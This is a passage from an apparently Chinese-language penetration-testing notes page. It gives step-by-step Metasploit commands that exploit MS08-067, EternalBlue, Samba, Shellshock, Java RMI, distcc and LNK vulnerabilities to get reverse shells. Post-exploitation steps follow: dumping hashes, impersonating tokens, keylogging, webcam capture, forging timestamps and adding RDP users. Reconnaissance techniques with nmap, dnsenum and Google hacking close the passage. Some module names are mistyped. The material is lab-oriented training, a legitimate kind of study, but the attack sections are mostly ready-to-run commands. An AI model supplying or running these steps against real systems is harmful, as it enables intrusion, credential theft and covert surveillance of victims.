来转移到其他进程的指令的源代码就在这个目录下。</li><li>Tools：&emsp;&emsp;&emsp;包括一些有用的脚本和零散的工具。</li></ol><h3 id="MSF中的常见命令"><a href="#MSF中的常见命令" class="headerlink" title="MSF中的常见命令"></a>MSF中的常见命令</h3><ol><li>编辑 &emsp;&emsp;&emsp;i</li><li>进入msf控制台&emsp;&emsp;msfconsole</li><li>保存 &emsp;&emsp;&emsp;：w</li><li>保存退出&emsp;：wq</li><li>帮助菜单&emsp;？</li><li>介绍某一个功能 &emsp;? + 某一命令（中间有空格）</li><li>搜索漏洞&ensp;&emsp;search ；例如 search ms08-067&emsp;ms是微软的缩写， 08-067表示08年6月7日，介绍该漏洞属于哪个模块，modules表示模块</li><li>使用某一模块&emsp;&emsp;&emsp;use + 模块名</li><li>查看某一模块的所有信息&emsp;&emsp;&emsp;使用模块后，info即可查看，其中available targets表示该漏洞出现在哪些主机上 其中basic options提供了该漏洞的使用方法需要提供RPOST：被攻击主机名，被攻击主机端口：RPORT</li><li>进入kali中msf的目录&emsp;&emsp;cd metasploit -framework  </li><li>在9的前提下，在目录中查看目录下的文件名称&emsp;&emsp; ls查看所有模块</li><li>返回上一级目录&emsp;&emsp;&emsp; cd..</li><li>show options &emsp;&emsp;&emsp;可提供操作提示，与info差不多  </li><li>back：返回命令  </li><li>set：给一个变量赋值  </li><li>net user：查看当前所有用户  </li><li>net user test test /add：添加用户  </li><li>session -i ：查看攻击后返回的信息  </li><li>ifconfig：linux系统中查看ip地址命令  </li><li>ctrl + H: 打开kali文件夹下的隐藏文件  </li><li>telnet ip+端口 ：扫描计算机的端口</li></ol><h3 id="MSF渗透测试一"><a href="#MSF渗透测试一" class="headerlink" title="MSF渗透测试一"></a>MSF渗透测试一</h3><p>攻击xp系统，注意是sp2chinese版本的  </p><ol><li>msfconsole &emsp;&emsp;&emsp;进入msf  </li><li>search ms08_067  &emsp;&emsp;&emsp;搜索漏洞  </li><li>use exploit/windows/smb/ms08_067_netapi &emsp;&emsp;使用该漏洞  </li><li>show options &emsp;&emsp;&emsp;展示使用方法，看reqiured选项如果是yes是必须设置的，flase则可以不设置   </li><li>set RHOST 192.168.80.128：设置被攻击者的ip  </li><li>info：查看该所有可以被攻击的系统版本 并且在base options中查   </li><li>check：检查该目标主机能够被攻击  </li><li>exploit：使用该命令开始攻击</li></ol><h3 id="MSF渗透测试二"><a href="#MSF渗透测试二" class="headerlink" title="MSF渗透测试二"></a>MSF渗透测试二</h3><p>利用自己创建链接获取控制其他计算机的权限    </p><ol><li>同上  </li><li>同上  search ms10_018  </li><li>同上  </li><li>use exploit/windows/browser/ms10_018_ie_behaviors  </li><li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li><li>set PAYLOADS windows/meterpreter/bind_tcp  </li><li>show options： 查看payloads的使用方法  </li><li>set LPORT： 设置端口  </li><li>run:  运行后出现url地址，复制，作为一个链接  </li><li>当有计算机点击该链接时，kali后台就会返回successful  </li><li>接下来就可以拿shell了，控制目标计算机  </li><li>sessions：查看返回来的会话，如果有多个电脑被攻击，就返回多个电脑的信息  </li><li>sessions -i 1：查看受控制的第一个电脑  </li><li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087      </li><li>同上  </li><li>search ms10-087</li><li>同上  </li><li>use  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  </li><li>show options  </li><li>set FILENAME oldboy.rtf：将文件改一个名字，默认为msf.rtf  </li><li>set PAYLOAD windows/exec ：上传一个payload  </li><li>show options：  </li><li>set CMD calc.exe :上传一个计算机程序  </li><li>run：开始生成一个文件  </li><li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li></ol><h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010 即勒索病毒  </p><ol><li>同上  </li><li>search ms-17-010  </li><li>use exploitwindows/smb/ms17-010-eternalblue  </li><li>show options      </li><li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST     </li><li>set payloads windows/x64/smb/meterpreter/reverse_tcp    </li><li>run：运行攻击    </li><li>拿shell，获取计算机权限。  </li><li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。<h3 id="渗透测试五"><a href="#渗透测试五" class="headerlink" title="渗透测试五"></a>渗透测试五</h3>linux漏洞  </li><li>进入msf</li><li>search scanner/samba  </li><li>use auxiliary/scanner/smb/smb_version：设置版本  </li><li>set RHOST ip地址  :设置被攻击ip  </li><li>run ：开始运行  </li><li>use expoit/multi/samba/usermap_script  </li><li>set RHOST ip地址：设置被攻击ip  </li><li>exploit ：开始攻击  </li><li>拿shell  </li></ol><h3 id="另一种linux漏洞"><a href="#另一种linux漏洞" class="headerlink" title="另一种linux漏洞"></a>另一种linux漏洞</h3><p>影响了samba3.5以后的版本，不包括4.6.4/4.5.10/4.4.14 </p><ol><li>samba -v：查看samba版本  </li><li>vi /etc/samba/smb.conf：打开目录下这个文件，/表示root根目录下   </li><li>在末行加入  <pre><code> [public]        comment = public       broweseable = yes       writeable = yes       path = /tmp/public       public = yes       read only = no  </code></pre></li><li>mkdir /tmp/public :在linux2017中添加共享目录  </li><li>chmod 777 /tmp/public :修改读写权限  </li><li>/etc/init.d/samba restart :重启samba  </li><li>ps aux |grep samba : 查看samba进程  </li><li>netstat -tnlp samba ：查看端口  </li><li>进入msf，use exploit/linux/samba/is_known_pipename :利用模块  </li><li>set RHOST：设置RHOST  </li><li>run：拿shell    </li><li>check：检查靶机是否存在该漏洞  </li></ol><h3 id="破壳漏洞"><a href="#破壳漏洞" class="headerlink" title="破壳漏洞"></a>破壳漏洞</h3><p>原理: CGI脚本利用了bash命令，由于bash版本较低，攻击者把有害数据写入环境变量，传入服务器端，触发服务器运行bash命令，完成攻击  </p><ol><li>进入到靶机的 usr/lib/cgi-bin目录下，输入sudo nano hello.sh :sudo表示linux系统管理员权限 nano 表示打开某一个文件进行编辑，类似于vim  </li><li>对hello.sh进行编辑,输入echo “Content-type : text/html” echo “hello world”   </li><li>sudo chmod s775 hello.sh:为文件赋予权限  </li><li>攻击机中启动msf，搜索 search shellshock  </li><li>use exploit/multi/apache_mod_cgi_bash-env-exec  </li><li>set Rhost:  </li><li>set targeturi /cgi-bin/hello.sh  </li><li>set payload linux/x86/shell/reverse_tcp  </li><li>check ,exploit<br>攻击失败</li></ol><h3 id="PHP-CGI漏洞"><a href="#PHP-CGI漏洞" class="headerlink" title="PHP CGI漏洞"></a>PHP CGI漏洞</h3><ol><li>进入msf  </li><li>search cve:2012-1823  </li><li>use exploit/multi/http php_cgi_arg_injection</li><li>options  </li><li>set RHOST ip地址  </li><li>run  <h3 id="Java-RMI-SERVER漏洞"><a href="#Java-RMI-SERVER漏洞" class="headerlink" title="Java RMI SERVER漏洞"></a>Java RMI SERVER漏洞</h3></li><li>Java rmi server 的注册表和rmi激活服务的默认配置存在安全漏洞导致代码执行  </li><li>search java_rmi_server  </li><li>use exploit/multi/misc/java_rmi_server  </li><li>set RHOST ip地址  </li><li>run  </li><li>shell  </li></ol><h3 id="java-cve-2013-0422漏洞"><a href="#java-cve-2013-0422漏洞" class="headerlink" title="java cve-2013-0422漏洞"></a>java cve-2013-0422漏洞</h3><ol><li>进入msf  </li><li>search java_jre17_jmxbean  </li><li>use exploit/multi/browser/java_jre17_jmxbean  </li><li>set RHOST ip地址  </li><li>set target  </li><li>set payload linux/x86…..  </li><li>set LHOST  </li><li>run  </li></ol><h3 id="distcc后门漏洞"><a href="#distcc后门漏洞" class="headerlink" title="distcc后门漏洞"></a>distcc后门漏洞</h3><p>distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是xcode1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制    </p><ol><li>进入msf  </li><li>search distcc_exec  </li><li>use expoit/unix/misc/distcc_exec  </li><li>set RHOST  </li><li>run  </li></ol><h3 id="druby命令执行漏洞"><a href="#druby命令执行漏洞" class="headerlink" title="druby命令执行漏洞"></a>druby命令执行漏洞</h3><p>druby配置不当，被滥用执行命令，druby是个编程语言，msf中的工具就是由druby写的，端口8787  </p><ol><li>启动msf  </li><li>search drb_remote_codeexec  </li><li>use exploit/linux/drb_remote_codeexec  </li><li>set RHOST  </li><li>set URL druby://ip地址:8787</li><li></li></ol><h3 id="震网三代"><a href="#震网三代" class="headerlink" title="震网三代"></a>震网三代</h3><p>CVE-2017-8464文件远程代码执行漏洞，当系统在解析快捷方式时，存在远程执行任意代码的高危漏洞<br>CVE-2017-8543windows，window处理内存中的对象，存在搜索远程命令执行漏洞<br>攻击机kali<br>靶机win7  </p><ol><li>进入msf  </li><li>search 2017—8464  </li><li>use exploit/windows/fileformat/cve_2017_8464_lnk_rce  </li><li>set payload windows/meterpreter/reverse_tcp  </li><li>set LOST 攻击机IP  </li><li>exploit  </li><li>会在路径下生成一些文件，将该文件放到win7中  </li><li>开始设置msf监听。  </li><li>在msf下，search multi/handler  </li><li>use exploit/multi/handler  </li><li>set payload windows/meterpreter/reverse_tcp  </li><li>set LHOST ip  </li><li>run  </li></ol><h3 id="flash-0day病毒"><a href="#flash-0day病毒" class="headerlink" title="flash 0day病毒"></a>flash 0day病毒</h3><p>不好用</p><h3 id="MSF辅助模块"><a href="#MSF辅助模块" class="headerlink" title="MSF辅助模块"></a>MSF辅助模块</h3><p>1.Auxiliary模块，情报搜集阶段<br>   可以使用 whois 来进行信息搜集（linux自带whois）例如 whois baidu.com<font color="red">这里不要添加www.</font> 进行域名详细信息查询<br>   ip地址详细信息查询，whois 114.114.114.114<br>   利用辅助模块查找邮箱 use auxiliary/gather/search_email_collector,设置domain也就是域名，<a href="http://www.baidu.com,将Google关掉" target="_blank" rel="noopener">www.baidu.com,将Google关掉</a> set search_google false ,run即可，因为百度中没有存在邮箱，所以搜索为0<br>   或者使用枚举 use auxiliary/gather/enum_dns<br>   set domin baidu.com <font color="red">注意这里域名不要加www.因为枚举模块会自动添加</font>，run即可<br>2.端口扫描模块<br> （1）nmap：namp -sV 192.168….<br> （2）syn扫描：扫描器向目标主机端口发送请求链接的syn包，扫描器收到syn/ack后，不是发送ack应答，而是发送rst包请求断开，这样没有完成三次握手，无法建立连接，因此这种扫描不会被记录到系统日志中，及不会留下痕迹，但是这种扫描需要root权限。<br>使用：use auxiliary/scanner/portscan/syno<br> options -&gt;set RHOSTS ——》set threads(设置线程为100) 100-》run<br>（3）TCP扫描：use auxiliary/scanner/portscan/tcp-&gt;set RHOSTS -&gt;set threads<br>3.服务版本信息检测<br>   1（smb）<br>   服务器消息块（Server Message Block，缩写为SMB），又称网络文件共享系统（Common Internet File System，缩写为CIFS, /ˈsɪfs/），一种应用层网络传输协议，由微软开发，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。它也提供经认证的行程间通信机能。<br>   使用:use auxiliary/scanner/smb/smb_version -&gt;set RHOSTS -&gt;run<br>   2(SSH版本扫描)<br>   SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题<br>   使用:use auxiliray/scanner/ssh/ssh_version ——&gt; set RHOSTS<br>   3(FTP)版本扫描<br>  文件传输协议（File Transfer Protocol，FTP）是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输而不是 UDP， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。<br>   使用：use auxiliary/scanner/ftp/ftp_verson -&gt;set RHOSTS -&gt;set threads-&gt;run  </p><h3 id="拿到meterpreter-shell之后，后期攻击方法"><a href="#拿到meterpreter-shell之后，后期攻击方法" class="headerlink" title="拿到meterpreter shell之后，后期攻击方法"></a>拿到meterpreter shell之后，后期攻击方法</h3><p><font color="red">注意，后面的所有方法都是建立在获取了meterpreter shell之后的操作</font></p><ol><li>上传文件到windows主机 命令upload &lt;文件名称&gt; &lt;路径&gt;        </li><li>下载主机上的文件 download <file> &lt;保存路径&gt;<font color="red">注意windows路径要使用双下划//</font>   </file></li><li>在靶机上执行exe文件 ：execute -f &lt;路径&gt;  </li><li>创建cmd新通道,即在靶机上执行命令提示符 execute -f cmd -c </li><li>显示进程 ： ps  </li><li>获取靶机的cmd shell :shell  </li><li>获取admin权限：getsystem  </li><li>使用hashdump转存所有hash值  </li><li>创建端口转发：meterpreter shell中<font color="red">注意这里需要使用正确的payload获得meterpreter权限</font>可以让攻击系统访问无法直接访问的主机，例如内网。使用 获取到meterpreter之后，使用portfwd add -l 6666 -p 3389 -r 127.0.0.1将靶机的3389转发到本地的6666端口，这样我们访问127.0.0.1时就可以访问靶机。  </li><li>删除端口转发<br>  portfwd delete -l &lt;端口名&gt; -p &lt;端口名&gt; -r &lt;目标主机&gt;  </li><li>在目标主机上搜索文件<br>  search -f *.txt  </li><li>获取用户id<br>getuid</li><li>获取系统信息<br>sysinfo  </li><li>模拟任意用户（taken操作）<br>use incognito：假冒用户takens<br>例子 getuid   查看当前系统id<br>use incognito 伪装<br>list tokens -u 列出目标用户的可用令牌<br>impersonate_token”Machine\user”<br>getuid  </li><li>webcam摄像头命令<br>webcam_list:查看摄像头<br>webcam__snap :通过摄像头拍照<br>webcam_stream:通过摄像头开启视频  </li></ol><p>16.execute执行文件<br>   execute -H -i -f cmd.exe  #创建新进程cmd.exe -H不可见，-i交互<br>17.timestomp伪造时间戳<br>     timestomp C:// -h 查看帮助<br>   timestomp -v C://2.txt 查看文件的时间戳<br>     timestomp C://2.txt -f C://1.txt 将1.txt的时间戳复制给2.txt<br>18.enable_rdp脚本开启3389<br> run post/windows/manage/enable_rdp  #开启远程桌面<br>run post/windows/manage/enable_rdp USERNAME = www2 PASSWORD = 123456 #  添加用户<br>run post/windows/manage/enable_rdp FORWARD = true LPORT = 6662 #将3389端口转发到6662<br>19.键盘记录<br>  keyscan_start ：开始键盘记录<br>  keyscan_dump：到处记录数据<br>  keyscan_stop:结束键盘记录</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h4 id="步骤1-首先进行漏洞扫描，"><a href="#步骤1-首先进行漏洞扫描，" class="headerlink" title="步骤1.首先进行漏洞扫描，"></a>步骤1.首先进行漏洞扫描，</h4><p>如果无漏洞再进行信息搜集完成渗透。  </p><h4 id="2-子域名探测。"><a href="#2-子域名探测。" class="headerlink" title="2.子域名探测。"></a>2.子域名探测。</h4><p>根据主域名，可以获取二级域名，三级域名…<br>真正的一级域名是由一个合法的字符串+域名后缀组成，所以，lisp.com这种形式的域名才是一级域名，lisp是域名主体，.com是域名后缀，可以是.net也是域名后缀  所谓的二级域名实际就是一个一级域名下面的主机名，顾名思义，它是在一级域名前面加上一个字符串，比如asdx.lisp.com，它可以拥有与根顶级域名同样的功能，并且通过设置，可以拥有和跟顶级域名完全一样的功能<br>主要方法(1)dns域传送漏洞<br>dns传送漏洞原理</p><blockquote><p><a href="https://blog.csdn.net/itest_2016/java/article" target="_blank" rel="noopener">https://blog.csdn.net/itest_2016/java/article</a> details/78057445dnsenum oldboydu.com      </p></blockquote><p>例<code>dnsenum oldboyedu.com -f /dns.txt --dnsserver 114.114.114.114</code><br>说明：dnsenum 的目的是尽可能搜集一个域的信息可查询主机地址，域名服务器，mx record ,在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算 C 类地址并执行 whois 查询，执行反向查询，把地址段写入文件。上面一系列操作都是dnsenum执行的  </p><p>-h    查看工具使用帮助</p><p>–dnsserver    <server>    指定域名服务器</server></p><p>–enum    快捷选项，相当于”–threads 5 -s 15 -w”</p><p>–noreverse    跳过反向查询操作</p><p>–nocolor 无彩色输出</p><p>–private 显示并在”domain_ips.txt”文件结尾保存私有的 ips</p><p>–subfile <file> 写入所有有效的子域名到指定文件</file></p><p>-t, –timeout <value>    tcp 或者 udp 的连接超时时间，默认为 10s（时间单位：秒）</value></p><p>–threads <value> 查询线程数</value></p><p>-v, –verbose    显示所有的进度和错误消息</p><p>-o ,–output <file> 输出选项，将输出信息保存到指定文件</file></p><p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的 PTR</regexp></p><p>记录，在排查无效主机上非常有用</p><p>-w, –whois    在一个 C 段网络地址范围提供whois 查询</p><p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p><p> <code>dig axfr @axfr @ns5.csc108.com |more</code><br>dig命令是常用的域名查询工具，用来检测域名是否正常<br>参数1 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>2 -b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>3 -f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>4 -P：指定域名服务器所使用端口号；<br>5 -t&lt;类型&gt;：指定要查询的DNS数据类型；<br>6 -x&lt;IP地址&gt;：执行逆向域名查询；<br>7 -4：使用IPv4；<br>8 -6：使用IPv6；<br>9 -h：显示指令帮助信息。<br> (2) 通过系统域名备案号，再反查备案号相关的域名地址 http:<a href="http://www.beianhao.com" target="_blank" rel="noopener">www.beianhao.com</a><br> (3)ssL证书，通过查询SSL证书，获取域名 <a href="https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html" target="_blank" rel="noopener">https://myssl.com/ssl.html和https://www.chinassl.net/ssltools/ssl-checker.html</a><br> (4)google 搜索C段<br>比如在：127.127.127.4 这个 IP 上面有一个网站 127.4 这个服务器上面有网站我们可以想想.. 他几乎没什么漏洞！ 但是在他同C段127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255 任何一个站 之后提权来嗅探得到 127.4 这台服务器的密码 甚至3389 连接的密码后台登录的密码 如果运气好会得到很多的密码，C段就是127.127.127.1-127.127.127.255 B段就是127.127.0.0-127.127.255.255<br>（5）APP提取<br>（6）微信公众号<br>（7）字典枚举<br>参考后面的Burp app抓包<br> （8）公开dns源<br>Rapid7 下 Sonar 项目发布的： <a href="https://scans.io/study/sonar.fdns_v2。DNS" target="_blank" rel="noopener">https://scans.io/study/sonar.fdns_v2。DNS</a> 历史解析：    <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br>（9）威胁情报查询<br>华为安全情报 <a href="https://isecurity.huawei.com" target="_blank" rel="noopener">https://isecurity.huawei.com</a> </p><h4 id="google-hack使用语法"><a href="#google-hack使用语法" class="headerlink" title="google hack使用语法"></a>google hack使用语法</h4><p> inurl：用于搜索网页上的url例inurl：file  ，site:baidu.com inurl:login<br>intext：用于搜索网页部分中包含的文字  site:baidu.com intext:管理<br>site：限制搜索范围的域名，即指定网站进行搜索  例：intext:管理<br>filetype：搜索文件的后缀名或扩展名  例filetype:mdb，site:baidu.com filetype:txt<br>intitle：限制搜索的网页标题  site:baidu.com intitle:后台<br>allintitle:搜索所有关键字构成的网页标题<br>link：可以得到一个所有包含了指定url的页面列表  </p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>格式：nmap 使用ping的方式去探测，主要测试ip，端口，和服务版本<br>主机发现原理：发送探测包到目标主机，如果收到回复说明主机是开启的。<br>用来扫描哪些服务运行在哪些端口<br>用法<br>-sP:s表示start，P表示ping，进行ping扫描，可直接使用nmap+ip同时进行ip和端口的探测。<br>-p:进行端口扫描<br>-sT:s代表start，T代表TCP，完成三次握手的扫描，用于探测目标机是否可以进行渗透  -<br>-sS:TCP，syn扫描，即只进行二次握手，与sT作用差不多。<br>-sU:进行UDP的扫描<br>-sV:进行版本探测<br>-O:判断目标主机的操作系统，nmap +ip+-O<br>-A:进行全面扫描，可直接使用nmap +ip同时进行ip和端口的扫描。<br>-oA:o:output，A：all，表示保存在所有格式。<br>-sL: List Scan 列表扫描，仅将指定的目标的 IP 列举出来，不进行主机发现。</p><p>-sn: Ping Scan 只进行主机发现，不进行端口扫描。</p><p>-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。</p><p>-PS/PA/PU/PY[portlist]: 使用 TCPSYN/ACK 或 SCTP INIT/ECHO 方式进行发现。</p><p>-PE/PP/PM: 使用 ICMP echo, timestamp, and netmask 请求包发现主机。</p><p>-PO[protocollist]: 使用 IP 协议包探测对方主机是否开启。</p><p>-n/-R: -n 表示不进行DNS 解析；-R 表示总是进行 DNS 解析。</p><p>–dns-servers &lt;serv1[,serv2],…&gt;: 指定 DNS 服务器。</p><p>–system-dns: 指定使用系统的 DNS 服务器</p><p>–traceroute: 追踪每个路由节点<br>端口扫描<br>open：端口是开放的。closed：端口是关闭的。<br>filtered：端口被防火墙 IDS/IPS 屏蔽，无法确定其状态。unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。<br>用法<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans 的方式来对目标主机进行扫描。<br>-sU: 指定使用 UDP 扫描方式确定目标主机的 UDP 端口状况。<br>-sN/sF/sX: 指定使用 TCP Null, FIN, and Xmas scans 秘密扫描方式来协助探测对方的 TCP 端口状态。<br>–scanflags <flags>: 定制 TCP 包的 flags。<br>-sI &lt;zombiehost[:probeport]&gt;: 指定使用 idle scan 方式来扫描目标主机（前提需要找到合适的 zombie host）<br>-sY/sZ: 使用 SCTP INIT/COOKIE-ECHO 来扫描 SCTP 协议端口的开放的情况。<br>-sO: 使用 IP protocol 扫描确定目标机支持的协议类型。<br>-b <FTP relay host>: 使用 FTP bounce scan 扫描方式  </FTP></flags></p><pre><code>例如nmap –sS –sU –T4 –top-ports 300 1.1.1.100参数-sS 表示使用 TCP SYN 方式扫描 TCP 端口；-sU 表示扫描 UDP 端口；-T4 表示时间级别配置 4 级；--top-ports 300 表示扫描最有可能开放的 300 个端口（TCP 和 UDP 分别有300 个端口）。  </code></pre><p>版本侦测<br>    -sV: 指定让 Nmap 进行版本侦测<br>    –version-intensity <level>: 指定版本侦测强度（0-9），默认为 7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>–version-light: 指定使用轻量侦测方式 (intensity 2)<br>–version-all: 尝试使用所有的 probes 进行侦测 (intensity 9)<br>–version-trace: 显示出详细的版本侦测过程信息。</level></p><pre><code>例如nmap –sV 10.1.1.100</code></pre><p>os侦测<br>原理：Nmap 使用 TCP/IP 协议栈指纹来识别不同的操作系统和设备。<br>用法：-O: 指定 Nmap 进行 OS 侦测。<br>–osscan-limit: 限制 Nmap 只对确定的主机的进行 OS 探测（至少需确知该主机分别有一个 open 和 closed 的端口）。<br>–osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。<br>    <code>例如nmap -O 10.1.1.100</code>  </p><p>Burp APP抓包<br>1.让安卓手机和电脑连接同一wifi<br>2.查看电脑ip地址<br>3.设置手机代理ip，为局域网地址，端口随便，其他配置默认<br>4.电脑端设置burp site ，点击proxy，options，add和手机一样的ip地址和端口<br>5.在proxy -&gt; intercept下开启intercept is on可进行抓包<br>6.抓https包需要导入burp证书，<font color="red">注意，一个burp对应一个证书，所以如果以前安装过证书是没用的，需要重新安装</font> ，方法 proxy ，options import/export CA，export，选择保存路径，<font color="red">文件后缀名为.cer,因为手机只能安装cer的证书</font><br>7.将证书发送到手机，手机找到下载目录，将文件复制到手机的根目录<br>8.打开手机设置，安全与隐私，更多安全设置，从sd卡安装，找到cer文件，重命名<br>完成，可以进行抓包  </p><h4 id="3-敏感信息搜集"><a href="#3-敏感信息搜集" class="headerlink" title="3.敏感信息搜集"></a>3.敏感信息搜集</h4><h4 id="（1）web源码泄露"><a href="#（1）web源码泄露" class="headerlink" title="（1）web源码泄露"></a>（1）web源码泄露</h4><p>github信息泄露搜索能力比较强<br><a href="https://sec.xiaomi.com/article/37" target="_blank" rel="noopener">https://sec.xiaomi.com/article/37</a><br>信息搜集用到的地址：<br>1.百度网盘 ，<br>社工信息泄露：<a href="https://www.instantcheckmate.com/、http://www.uneihan.com/" target="_blank" rel="noopener">https://www.instantcheckmate.com/、http://www.uneihan.com/</a><br>源码搜索：<a href="https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net" target="_blank" rel="noopener">https://searchcode.com/、https://gitee.com/、gitcafe.com、code.csdn.net</a><br>钟馗之眼： <a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a><br>天 眼 查 <a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a><br>威胁情报：微步在线、 ti.360.cn、 Virustotal  </p><h4 id="2-邮箱信息搜集"><a href="#2-邮箱信息搜集" class="headerlink" title="(2) 邮箱信息搜集"></a>(2) 邮箱信息搜集</h4><p>在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester 可用于搜索Google、Bing 和 PGP 服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a>  ，注意安装之前需安装python3.6版本，下载完成之后执行python3 -m pip -r requirements.txt，安装完成</p><h4 id="（3）历史漏洞搜集"><a href="#（3）历史漏洞搜集" class="headerlink" title="（3）历史漏洞搜集"></a>（3）历史漏洞搜集</h4><p>wooyun 历史漏洞库：<a href="http://www.anquan.us/" target="_blank" rel="noopener">http://www.anquan.us/</a><br> 漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a>  </p><h4 id="（4）信息工具搜集"><a href="#（4）信息工具搜集" class="headerlink" title="（4）信息工具搜集"></a>（4）信息工具搜集</h4><p>如：7kbscan、破壳 Web 极速扫描器等</p><h4 id="4-指纹识别，waf，cdn识别"><a href="#4-指纹识别，waf，cdn识别" class="headerlink" title="4.指纹识别，waf，cdn识别"></a>4.指纹识别，waf，cdn识别</h4><p>1、在线识纹识别：<br>组件是网络空间最小单元，Web应用程序、数据库、中间件等都属于组件。指纹是组件上能标识对象类型的一段特征信息，用来在渗透测试信息收集环节中快速识别目标服务。大部分应用组件存在足以说明当前服务名称和版本的特征，识别这些特征获取当前服务信息，也即表明该系统采用那个公司的产品。<br><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a><br>2.waf识别<br>github.com/EnableSecurity/wafw00f<br>3.CDN识别<br><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py</a>  </p><h4 id="5-资产管理"><a href="#5-资产管理" class="headerlink" title="5.资产管理"></a>5.资产管理</h4><p>有了庞大的域名，接下来就是帮助 SRC 梳理资产了。域名可以先判断存活，活着的继续进行确定 IP 环节。根据 IP 的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址：  </p><p><strong>SRC 众测平台</strong> </p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/" target="_blank" rel="noopener">https://www.hackerone.com/</a> BugX<br>区块链漏洞平台 <a href="http://www.bugx.org/" target="_blank" rel="noopener">http://www.bugx.org/</a> Gsrc<br>瓜子 src <a href="https://security.guazi.com/" target="_blank" rel="noopener">https://security.guazi.com/</a><br>区块链安全响应中心 <a href="https://dvpnet.io/" target="_blank" rel="noopener">https://dvpnet.io/</a><br>CNVD 国家信息安全漏洞平台 <a href="http://www.cnvd.org.cn/" target="_blank" rel="noopener">http://www.cnvd.org.cn/</a><br>漏洞银行：<a href="https://www.bugbank.cn/" target="_blank" rel="noopener">https://www.bugbank.cn/</a><br>360 补天：<a href="https://www.butian.net/" target="_blank" rel="noopener">https://www.butian.net/</a><br>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/" target="_blank" rel="noopener">https://src.edu-info.edu.cn/login/</a></p><p><strong>国内平台</strong></p><p>知道创宇 Seebug 漏洞平台 <a href="https://www.seebug.org/" target="_blank" rel="noopener">https://www.seebug.org/</a><br>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/" target="_blank" rel="noopener">http://ivd.winicssec.com/</a><br>打造中文最大exploit 库 <a href="http://www.expku.com/" target="_blank" rel="noopener">http://www.expku.com/</a><br>为数不多的漏洞管理插件收集平台 <a href="http://www.bugscan.net/source/template/vulns/" target="_blank" rel="noopener">http://www.bugscan.net/source/template/vulns/</a><br>一家管理漏洞收集的平台 <a href="http://www.0daybank.org/" target="_blank" rel="noopener">http://www.0daybank.org/</a></p><p><strong>国外平台</strong></p><p>国际漏洞提交平台 <a href="https://www.hackerone.com/" 